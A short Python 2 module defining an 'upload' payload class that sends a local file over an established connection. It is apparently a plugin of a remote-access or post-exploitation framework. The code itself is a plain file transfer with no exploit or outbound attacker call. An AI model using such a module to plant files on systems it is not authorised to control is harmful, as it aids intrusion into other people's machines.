import modules
class payload:
    def __init__(self):
        self.name = "upload"
        self.description = "upload file"
        self.type = "upload"
        self.id = 126
    
    def run(self,conn,server,command):
        args = command.split()
        if len(args) < 2:
            print "Usage: upload path/to/localfile"
        else:
            uploadTo = args[1].split("/")
            uploadTo = uploadTo[len(uploadTo) - 1]
            server.uploadFile(args[1],uploadTo,conn)
        return ""
